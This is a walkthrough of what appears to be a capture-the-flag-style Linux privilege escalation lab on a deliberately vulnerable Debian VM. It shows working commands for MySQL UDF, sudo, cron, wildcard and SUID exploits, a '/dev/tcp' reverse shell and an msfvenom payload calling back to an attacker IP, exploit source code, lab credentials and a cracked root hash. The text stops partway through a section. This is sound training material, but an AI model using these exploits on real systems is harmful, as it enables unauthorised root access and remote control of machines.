# Linux Privilege Escalation

## Deploying the Vulnerable Debian VM

### What is the purpose of this VM?

This room is designed to guide you through various Linux Privilege Escalation techniques. To achieve this, you must first deploy an intentionally vulnerable Debian VM. This VM was initially created by Sagi Shahar as part of his local privilege escalation workshop and has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

### Prerequisites

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before attempting to access the Debian VM!

### How do I access the VM?

SSH should be available on port 22. You can log in to the “user” account using the following command:

```bash
ssh user@10.10.48.224
```

If you encounter the message: “Are you sure you want to continue connecting (yes/no)?”, type `yes` and press Enter.

The password for the “user” account is:

```bash
password321
```

### Important Note

The next tasks will walk you through different privilege escalation techniques. After each technique, you should obtain a root shell. Remember to exit out of the shell and/or re-establish a session as the “user” account before starting the next task!

### Q1. First, let's deploy the machine and log in to the “user” account using SSH.

#### Action

To connect, use the following SSH command:

```bash
ssh user@10.10.199.72
```

When prompted with the following message, respond as instructed:

```
The authenticity of host '10.10.199.72 (10.10.199.72)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
Are you sure you want to continue connecting (yes/no)?
```

Type `yes` and press Enter.

**Explanation:**  
SSH (Secure Shell) allows us to securely connect to the target machine, providing us with command-line access to begin our privilege escalation practice.

### Q2. What is the result of the “id” command?

#### Action

Once logged in, run the following command to check the user ID, group ID, and associated groups:

```bash
id
```

**Sample Output:**

```bash
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

**Explanation:**  
The `id` command displays the user ID (UID), group ID (GID), and the groups the current user belongs to. This information is essential for understanding the user's privileges on the system and potential avenues for privilege escalation.


## Service Exploits

### Exploiting the MySQL Service

The MySQL service is running as root, and the "root" user for the service does not have a password assigned. This allows us to use a popular exploit that takes advantage of User Defined Functions (UDFs) to execute system commands as root via the MySQL service.

### Step 1: Compile the Exploit Code

First, navigate to the directory containing the exploit code:

```bash
cd /home/user/tools/mysql-udf
```

Compile the `raptor_udf2.c` exploit code using the following commands:

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

### Step 2: Connect to MySQL as Root

Connect to the MySQL service as the root user with no password:

```bash
mysql -u root
```

### Step 3: Create a User Defined Function (UDF)

Execute the following commands within the MySQL shell to create a UDF named `do_system` using the compiled exploit:

```bash
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

### Step 4: Exploit the UDF to Gain Root Privileges

Use the `do_system` function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

### Step 5: Gain a Root Shell

Exit the MySQL shell and execute the `/tmp/rootbash` executable with the `-p` option to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

### Step 6: Clean Up

Remove the `/tmp/rootbash` executable and exit the root shell before proceeding:

```bash
rm /tmp/rootbash
exit
```

### Q1. Follow the steps above to exploit the MySQL service.

**No answer needed**

## Weak File Permissions - Readable /etc/shadow

### Understanding the /etc/shadow File

The `/etc/shadow` file contains user password hashes and is typically readable only by the root user. However, on this VM, the `/etc/shadow` file is world-readable.

### Step 1: Verify File Permissions

Check the permissions of the `/etc/shadow` file:

```bash
ls -l /etc/shadow
```

### Step 2: View the Contents of /etc/shadow

Display the contents of the `/etc/shadow` file:

```bash
cat /etc/shadow
```

Each line represents a user, with their password hash located between the first and second colons (`:`) of each line.

### Step 3: Crack the Root User's Password Hash

Save the root user’s password hash to a file called `hash.txt` on your Kali VM and use John the Ripper to crack it. Depending on your Kali version, you may need to unzip the `rockyou.txt` wordlist and use `sudo`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Step 4: Switch to the Root User

Once the password is cracked, switch to the root user:

```bash
su root
```

### Q1. What is the root user’s password hash?

#### Action

Start by checking the permissions of the `/etc/shadow` file to see if it is accessible by non-root users:

```bash
ls -l /etc/shadow
```

**Sample Output:**

```bash
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

**Explanation:**  
The output above shows the permissions for the `/etc/shadow` file. The file is owned by the `root` user and the `shadow` group. The permissions `-rw-r--rw-` indicate that the file is readable and writable by the owner (`root`), readable by others in the `shadow` group, and incorrectly readable (but not writable) by all users on the system (indicated by the final `rw-`). This is a significant misconfiguration because it allows any user to read sensitive password hashes.

Next, view the contents of the `/etc/shadow` file and extract the line corresponding to the root user:

```bash
cat /etc/shadow | grep root
```

**Sample Output:**

```bash
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

**Explanation:**  
The output shows the entry for the root user from the `/etc/shadow` file. This line contains several fields separated by colons (`:`):

- `root`: The username.
- `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`: The password hash, which is the critical piece of information. The format of this hash is `$id$salt$hash`, where `$6$` indicates that the hash was generated using the SHA-512 algorithm.
- `17298`: The date of the last password change, represented as the number of days since January 1, 1970.
- `0`: The minimum number of days required between password changes.
- `99999`: The maximum number of days the password is valid.
- `7`: The number of days before the password expires that the user is warned.
- The remaining fields are typically used for password expiration and account inactivity settings.

#### Saving the Hash for Cracking

To further analyze or crack the root password, save this hash to a file on your workstation:

```bash
sshpass -p "password321" ssh user@10.10.48.224 cat /etc/shadow | grep root > root.hash
cat root.hash
```

**Explanation:**  
The `cat` command is used here to verify that the hash has been saved correctly. This hash can now be used with password-cracking tools like John the Ripper to attempt to recover the original password.

**Answer:**  
`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

### Q2. What hashing algorithm was used to produce the root user’s password hash?

The format of the password hash is `$id$salt$hash`. Possible values for the ID are:

- `$1$`: MD5
- `$2$`: Blowfish
- `$5$`: SHA256
- `$6$`: SHA512

**Answer:** `sha512crypt`

### Q3. What is the root user’s password?

Run John the Ripper on the hash file:

```bash
john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Sample Output:**

```bash
password123      (root)
```

**Answer:** `password123`

## Weak File Permissions - Writable /etc/shadow

### Understanding the /etc/shadow File

The `/etc/shadow` file is crucial for system security as it contains the hashed passwords of all users. Normally, this file is only readable by the root user, which prevents unauthorized access to sensitive password data.

### Step 1: Check the File Permissions

First, verify the permissions of the `/etc/shadow` file:

```bash
ls -l /etc/shadow
```

**Sample Output:**

```bash
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

**Explanation:**  
In the output above, the permissions `-rw-r--rw-` indicate that the file is readable and writable by the owner (`root`), readable by the group (`shadow`), and incorrectly both readable and writable by all other users on the system (indicated by `rw-` at the end). This misconfiguration is critical as it allows any user to edit the file, enabling unauthorized privilege escalation.

### Step 2: Generate a New Password Hash

To exploit this vulnerability, generate a new password hash for a password of your choice:

```bash
mkpasswd -m sha-512 newpasswordhere
```

**Explanation:**  
This command creates a SHA-512 hash for the password you provide. The SHA-512 hashing algorithm is secure and widely used for password storage. The generated hash will be used to replace the current root user's password hash in the `/etc/shadow` file.

### Step 3: Replace the Root User's Password Hash

Edit the `/etc/shadow` file to replace the existing root user’s password hash with the one you just generated. You can use a text editor like `vim` or `nano`:

```bash
vim /etc/shadow
```

Locate the line for the root user, which typically starts with `root:`, and replace the hash (which follows the first colon) with your new hash.

### Step 4: Gain Root Access

After saving the changes, switch to the root user using the new password you set:

```bash
su root
```

**Explanation:**  
By replacing the root user’s password hash in the `/etc/shadow` file with your own, you can effectively reset the root password to a value you know. This allows you to gain root access by simply using the `su` command.

### Step 5: Clean Up

After you have verified root access, remember to exit the root shell and restore any changes if necessary:

```bash
exit
```

**No Answer Needed**

## Weak File Permissions - Writable /etc/passwd

### Understanding the /etc/passwd File

The `/etc/passwd` file stores user account information, including usernames, UID, GID, home directory, and shell. Historically, it also stored password hashes, but these are now typically stored in `/etc/shadow`. The `/etc/passwd` file is world-readable but should only be writable by the root user.

### Step 1: Check the File Permissions

Check the permissions of the `/etc/passwd` file:

```bash
ls -l /etc/passwd
```

**Sample Output:**

```bash
-rw-r--rw- 1 root root 2039 Aug 25  2019 /etc/passwd
```

**Explanation:**  
The permissions `-rw-r--rw-` indicate that the file is readable and writable by the owner (`root`) and readable by others. The fact that it is writable by all users (indicated by `rw-` at the end) is a serious vulnerability because it allows any user to modify the file and potentially escalate privileges.

### Step 2: Generate a New Password Hash

Create a new password hash using the following command:

```bash
openssl passwd newpasswordhere
```

**Explanation:**  
This command generates a cryptographic hash of the password you provide using the DES-based crypt method, which is compatible with the format expected by the `/etc/passwd` file.

### Step 3: Replace the Root User’s Password

Edit the `/etc/passwd` file and replace the `x` in the root user’s entry with the newly generated password hash:

```bash
vim /etc/passwd
```

Alternatively, you can copy the root user’s entry, modify it, and create a new user with root privileges:

1. Copy the root user’s row and append it at the bottom of the file.
2. Change the first instance of `root` to `newroot`.
3. Replace the `x` with your generated password hash.

### Step 4: Gain Access with the New User

Switch to the root user (or the newly created `newroot` user) using the password associated with the hash:

```bash
su root
```

Or:

```bash
su newroot
```

**Explanation:**  
Modifying the `/etc/passwd` file allows you to either change the root password or create a new user with root privileges, both of which enable you to gain root access.

### Q1. Run the `id` command as the newroot user. What is the result?

After switching to the `newroot` user, verify the user’s privileges:

```bash
id
```

**Sample Output:**

```bash
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
The output confirms that the `newroot` user has UID 0, meaning it has root privileges, allowing full control over the system.

**Answer:**  
The `id` command shows that the `newroot` user has root privileges (`uid=0(root)`).

---

## Sudo - Shell Escape Sequences

### Step 1: List Sudo-Allowed Programs

List the programs that your user can run with `sudo` without a password:

```bash
sudo -l
```

**Explanation:**  
This command lists the programs you are allowed to run with `sudo`. Some of these programs can be exploited to gain a root shell if they are improperly configured.

### Step 2: Use GTFOBins for Privilege Escalation

Visit [GTFOBins](https://gtfobins.github.io) and search for some of the programs listed. If the program is listed with "sudo" as a function, it can often be used to gain elevated privileges via a shell escape sequence.

**Example Commands:**

- **find**:
  ```bash
  sudo find . -exec /bin/sh \; -quit
  ```

- **vim**:
  ```bash
  sudo vim -c ':!/bin/bash'
  ```

- **man**:
  ```bash
  sudo man man
  !/bin/bash
  ```

- **awk**:
  ```bash
  sudo awk 'BEGIN {system("/bin/bash")}'
  ```

- **less**:
  ```bash
  sudo less /etc/profile
  !/bin/sh
  ```

- **ftp**:
  ```bash
  sudo ftp
  !/bin/sh
  ```

- **nmap**:
  ```bash
  sudo nmap --interactive
  nmap> !sh
  ```

### Q1. How many programs is "user" allowed to run via sudo?

Run the following command to count the number of root-level commands available via sudo:

```bash
sudo -l | grep "(root)" | wc -l
```

**Sample Output:**

```bash
11
```

**Answer:** 11

### Q2. One program on the list doesn’t have a shell escape sequence on GTFOBins. Which is it?

**Answer:** `apache2` was not found on GTFOBins.

## Sudo - Environment Variables

### Understanding Sudo and Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment. These variables can be leveraged to escalate privileges, particularly when the `LD_PRELOAD` and `LD_LIBRARY_PATH` environment variables are inherited.

### Step 1: Check Inherited Environment Variables

First, check which environment variables are inherited by sudo, focusing on `env_keep` options:

```bash
sudo -l
```

**Sample Output:**

```bash
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

**Explanation:**  
The output indicates that both `LD_PRELOAD` and `LD_LIBRARY_PATH` are preserved when running commands via sudo. These environment variables can be exploited to load malicious shared objects, which can execute arbitrary code with root privileges.

- **LD_PRELOAD**: This variable allows you to specify a shared object that will be loaded before any others when executing a program.
- **LD_LIBRARY_PATH**: This variable specifies directories where shared libraries are searched for first, allowing the injection of malicious libraries.

### Step 2: Exploit Using LD_PRELOAD

We can exploit `LD_PRELOAD` by creating a shared object that spawns a root shell when loaded. The exploit code is located in `/home/user/tools/sudo/preload.c`.

**1. Compile the Shared Object:**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

**Explanation:**  
This command compiles the C code into a shared object (`preload.so`). The flags used are:

- `-fPIC`: Generates position-independent code, which is necessary for shared objects.
- `-shared`: Produces a shared object suitable for dynamic linking.
- `-nostartfiles`: Avoids linking the standard startup files, which is typical for small shared libraries.

**2. Execute a Program with the LD_PRELOAD Exploit:**

Run a program that you are allowed to execute via sudo (listed in `sudo -l`), setting the `LD_PRELOAD` environment variable to the path of the compiled shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
```

**Sample Output:**

```bash
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
This command runs `ftp` with the `LD_PRELOAD` environment variable pointing to your malicious shared object, which is loaded by the dynamic linker before the `ftp` program. The shared object executes the exploit code, spawning a root shell.

### Step 3: Exploit Using LD_LIBRARY_PATH

You can also exploit `LD_LIBRARY_PATH` by creating a shared object with the same name as a library used by a target program. The exploit code for this method is located in `/home/user/tools/sudo/library_path.c`.

**1. Identify Required Libraries:**

Run `ldd` against the `apache2` program file to list the libraries it uses:

```bash
ldd /usr/sbin/apache2
```

**Explanation:**  
The `ldd` command prints the shared libraries required by a program, which can be targeted for substitution via `LD_LIBRARY_PATH`.

**2. Compile a Malicious Shared Object:**

Create a shared object with the same name as one of the libraries listed by `ldd`, for example, `libcrypt.so.1`:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

**Explanation:**  
This command compiles the C code into a shared object named `libcrypt.so.1`, which mimics a legitimate library but contains malicious code.

**3. Execute Apache2 with LD_LIBRARY_PATH Exploit:**

Run `apache2` using sudo while setting the `LD_LIBRARY_PATH` environment variable to the directory containing your malicious library:

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

**Sample Output:**

```bash
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
When `apache2` runs, it loads the malicious `libcrypt.so.1` from `/tmp` instead of the legitimate one, due to the `LD_LIBRARY_PATH` override. This results in executing the exploit code in the shared object, granting root access.

### Step 4: Experiment with Different Libraries

If the exploit does not work with one library, try renaming your shared object to match another library used by the target program. This process can be trial and error, depending on the program's requirements and how the library is loaded.

### Cleanup

After gaining root access, remember to exit the root shell and remove any malicious shared objects or files you created:

```bash
rm /tmp/preload.so /tmp/libcrypt.so.1
exit
```

### Q1. Follow the steps above to exploit the environment variables.

**No Answer Needed**

## Cron Jobs - File Permissions

### Understanding Cron Jobs and Crontabs

Cron jobs are scheduled tasks that are executed at specified times or intervals. The configurations for these jobs are stored in crontab files. The system-wide crontab, located at `/etc/crontab`, is used to schedule tasks that may be run as any user, including root.

### Step 1: View the System-Wide Crontab

To examine the currently scheduled cron jobs, view the contents of the system-wide crontab:

```bash
cat /etc/crontab
```

**Sample Output:**

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

**Explanation:**  
The crontab configuration specifies that two scripts, `overwrite.sh` and `compress.sh`, are scheduled to run every minute as the root user. This frequent execution can be exploited if either script is vulnerable or improperly secured.

### Step 2: Locate and Inspect the overwrite.sh Script

Next, locate the full path of the `overwrite.sh` script and inspect its permissions:

```bash
locate overwrite.sh
```

**Sample Output:**

```bash
/usr/local/bin/overwrite.sh
```

Check the file's permissions:

```bash
ls -l /usr/local/bin/overwrite.sh
```

**Sample Output:**

```bash
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

**Explanation:**  
The file permissions `-rwxr--rw-` indicate that `overwrite.sh` is writable by all users (`rw-` at the end). This is a serious security vulnerability because any user can modify the script, potentially injecting malicious code that will be executed as root.

### Step 3: Exploit the Vulnerable Script

Replace the contents of the `overwrite.sh` file with a reverse shell payload. First, edit the script:

```bash
vim /usr/local/bin/overwrite.sh
```

Replace its contents with the following, after adjusting the IP address to match your attack machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**Explanation:**  
This payload creates a reverse shell that will connect back to your attack machine on the specified IP address and port (`4444`). When the cron job runs `overwrite.sh`, it will execute this payload with root privileges.

### Step 4: Set Up a Netcat Listener

Set up a netcat listener on your Kali machine to catch the reverse shell:

```bash
nc -nvlp 4444
```

**Explanation:**  
Netcat (`nc`) is used here to listen on port `4444` for incoming connections. When the `overwrite.sh` script runs, it will initiate a connection to your netcat listener, giving you a root shell.

**Sample Output:**

```bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.51.207.
Ncat: Connection from 10.10.51.207:47436.
bash: no job control in this shell
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
Once the cron job executes the modified `overwrite.sh`, a connection will be made to your listener, and you will obtain a root shell.

### Cleanup

After confirming root access, exit the shell and remove the malicious code from `overwrite.sh`:

```bash
rm /usr/local/bin/overwrite.sh
exit
```

**No Answer Needed**

## Cron Jobs - PATH Environment Variable

### Step 1: Examine the PATH Variable in the Crontab

View the contents of the system-wide crontab to inspect the PATH environment variable:

```bash
cat /etc/crontab
```

**Sample Output:**

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

**Explanation:**  
The PATH variable defines the directories the system will search when executing commands. Notably, `/home/user` is included in the PATH, which is the home directory of the non-privileged user. This misconfiguration can be exploited by placing malicious scripts in this directory, as they may be executed by cron jobs running with higher privileges.

### Step 2: Create a Malicious Script in the User’s Home Directory

Create a script named `overwrite.sh` in your home directory with the following contents:

```bash
cat > /home/user/overwrite.sh << EOF
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF
```

**Explanation:**  
This script copies `/bin/bash` to `/tmp/rootbash` and sets the SUID permission, allowing it to be run with root privileges.

### Step 3: Ensure the Script is Executable

Make the script executable:

```bash
chmod +x /home/user/overwrite.sh
```

### Step 4: Wait for the Cron Job to Run

Since `/home/user` is in the PATH, the cron job that calls `overwrite.sh` will execute your script instead of the legitimate one. After waiting for the cron job to run (it executes every minute), use the following command to gain a root shell:

```bash
/tmp/rootbash -p
```

**Sample Output:**

```bash
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

**Explanation:**  
This output shows that the shell is running with root privileges (`euid=0`), allowing you to execute commands as the root user.

### Cleanup

Remove the `/tmp/rootbash` executable and the malicious `overwrite.sh` script, then exit the root shell:

```bash
rm /tmp/rootbash
rm /home/user/overwrite.sh
exit
```

### Q1. What is the value of the PATH variable in /etc/crontab?

**Answer:** `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

## Cron Jobs - Wildcards

### Step 1: Inspect the `compress.sh` Script

First, examine the contents of the other cron job script to understand how it operates:

```bash
cat /usr/local/bin/compress.sh
```

**Sample Output:**

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

**Explanation:**  
The `compress.sh` script is designed to compress all files in the `/home/user` directory into a tarball (`/tmp/backup.tar.gz`). The wildcard (`*`) in the `tar` command is used to include all files in the directory. This use of a wildcard can be exploited because the `tar` command can interpret files with specific names as command-line options.

### Step 2: Prepare for Exploitation Using `tar`

The `tar` command has a checkpoint feature that can be exploited to execute arbitrary commands. We will create specific files in the `/home/user` directory that `tar` will interpret as options rather than files, triggering the execution of a reverse shell.

**1. Generate a Reverse Shell Binary:**

On your Kali box, use `msfvenom` to create a reverse shell binary:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

**Explanation:**  
This command generates a Linux ELF binary (`shell.elf`) that, when executed, will connect back to your attack machine on the specified IP address and port (`4444`).

**2. Transfer the Reverse Shell Binary to the Target:**

Transfer the `shell.elf` binary to the Debian VM. You can use `scp`, `wget`, or any other method:

```bash
scp shell.elf user@10.10.51.207:/home/user/
```

**3. Make the Binary Executable:**

Ensure that the transferred binary is executable:

```bash
chmod +x /home/user/shell.elf
```

**Explanation:**  
Making the binary executable is crucial so that it can be run by the system when the cron job is triggered.

**4. Create Malicious Tar Checkpoint Files:**

Create the following two files in the `/home/user` directory:

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

**Explanation:**  
These files are named to look like valid `tar` command options. When `tar` processes the wildcard (`*`), it will treat these files as if they were command-line options and execute the `shell.elf` binary.

### Step 3: Set Up a Netcat Listener

Before the cron job runs, set up a netcat listener on your Kali box to catch the reverse shell:

```bash
nc -nvlp 4444
```

**Explanation:**  
Netcat will listen on port `4444` for incoming connections. Once the `tar` command runs, the reverse shell will connect back to this listener, giving you root access.

**Sample Output:**

```bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.51.207.
Ncat: Connection from 10.10.51.207:39219.
id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
Once the cron job runs, the reverse shell is executed, and a connection is made to your listener, granting you a root shell on the target system.

### Cleanup

After gaining root access, remove the files you created to prevent the cron job from executing the reverse shell again:

```bash
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
exit
```

### Q1. Follow the steps above.

**No Answer Needed**

## SUID / SGID Executables - Known Exploits

### Step 1: Find All SUID/SGID Executables

On the Debian VM, find all files with the SUID or SGID bit set, as these can potentially be exploited for privilege escalation:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

**Sample Output:**

```bash
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
...
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
```

**Explanation:**  
The output lists files with the SUID or SGID bit set. These files run with elevated privileges (those of the file's owner or group) and can be exploited if vulnerable.

### Step 2: Identify Vulnerable Executables

Focus on `/usr/sbin/exim-4.84-3`, which is a version known to have a local privilege escalation vulnerability. Search for known exploits for this specific version on platforms like Exploit-DB, Google, or GitHub.

### Step 3: Exploit Exim to Gain Root Access

A matching exploit, `CVE-2016-1531`, can be found on the system at `/home/user/tools/suid/exim/cve-2016-1531.sh`. This exploit takes advantage of the vulnerable `exim` version to escalate privileges to root.

**1. Review the Exploit Script:**

```bash
cat /home/user/tools/suid/exim/cve-2016-1531.sh
```

**Sample Script Content:**

```bash
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

**Explanation:**  
This script creates a Perl module (`/tmp/root.pm`) that is then loaded by `exim` using manipulated environment variables. When `exim` runs, it executes the Perl module, which in turn spawns a root shell.

**2. Execute the Exploit:**

```bash
sh /home/user/tools/suid/exim/cve-2016-1531.sh
```

**Sample Output:**

```bash
[ CVE-2016-1531 local root exploit
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)
```

**Explanation:**  
Running the exploit script successfully spawns a root shell, providing full administrative access to the system.

### Cleanup

After confirming root access, exit the shell:

```bash
exit
```

### Q1. Follow the steps above.

**No Answer Needed**

## SUID / SGID Executables - Shared Object Injection

### Step 1: Identify the Vulnerability

The `/usr/local/bin/suid-so` executable is a SUID program, which means it runs with elevated privileges, typically root. This executable is vulnerable to shared object injection, a technique where the program is tricked into loading a malicious shared object that grants higher privileges or executes arbitrary code.

First, execute the file to observe its current behavior:

```bash
/usr/local/bin/suid-so
```

**Sample Output:**

```bash
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

**Explanation:**  
The executable displays a progress bar, indicating that it performs some calculation or task before exiting. No apparent vulnerability is visible at this point.

### Step 2: Analyze with strace

To uncover the vulnerability, use `strace` to monitor the system calls made by the executable, particularly focusing on `open` and `access` system calls to identify any "No such file" errors:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

**Sample Output:**

```bash
access("/home/user/.config/libcalc.so", F_OK) = -1 ENOENT (No such file or directory)
```

**Explanation:**  
The output indicates that the executable attempts to load the shared object `/home/user/.config/libcalc.so`, but the file is missing (`ENOENT`). This suggests that if we can place a malicious shared object at this location, it will be loaded and executed with the privileges of the SUID program.

### Step 3: Exploit the Vulnerability

**1. Create the Required Directory:**

Since the executable is looking for the shared object in the `.config` directory within the user's home directory, create this directory:

```bash
mkdir /home/user/.config
```

**2. Review and Compile the Malicious Shared Object:**

The exploit code is available at `/home/user/tools/suid/libcalc.c`. This code is designed to spawn a root shell when executed:

```bash
cat /home/user/tools/suid/libcalc.c
```

**Sample Code:**

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

**Explanation:**  
This code uses a constructor attribute (`__attribute__((constructor))`), which makes the `inject()` function execute automatically when the shared object is loaded. The function elevates privileges to root (`setuid(0)`) and spawns a bash shell with preserved privileges.

**3. Compile the Shared Object:**

Compile the C code into a shared object at the location where the SUID executable expects to find it:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

**Explanation:**  
The `-shared` flag creates a shared object, and `-fPIC` ensures that the code is position-independent, which is necessary for shared libraries.

### Step 4: Execute the SUID Program

Now, run the SUID executable again:

```bash
/usr/local/bin/suid-so
```

**Sample Output:**

```bash
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

**Explanation:**  
Instead of displaying the progress bar, the SUID executable now spawns a root shell (`uid=0`), indicating that the shared object injection was successful.

### Cleanup

After gaining root access, remember to exit the root shell and remove the malicious shared object to clean up:

```bash
rm /home/user/.config/libcalc.so
exit
```

**No Answer Needed**

## SUID / SGID Executables - Environment Variables

### Step 1: Identify the Vulnerability

The `/usr/local/bin/suid-env` executable is vulnerable because it inherits the user's `PATH` environment variable. This means it attempts to execute programs using the `PATH` variable without specifying absolute paths, which can be exploited.

First, run the executable to observe its behavior:

```bash
/usr/local/bin/suid-env
```

**Sample Output:**

```bash
[....] Starting web server: apache2httpd (pid 1496) already running
. ok
```

**Explanation:**  
The output suggests that the executable tries to start the Apache web server. This is a clue that the program calls the `service` command to start the server, but the command is not being called with an absolute path.

### Step 2: Analyze the Executable

Use the `strings` command to search for readable strings within the executable, which can reveal important information about its operations:

```bash
strings /usr/local/bin/suid-env
```

**Sample Output:**

```bash
service apache2 start
```

**Explanation:**  
The output confirms that the executable attempts to run the `service` command without specifying its full path. This allows us to exploit the vulnerability by creating a malicious `service` executable in a directory that appears earlier in the `PATH`.

### Step 3: Exploit the Vulnerability

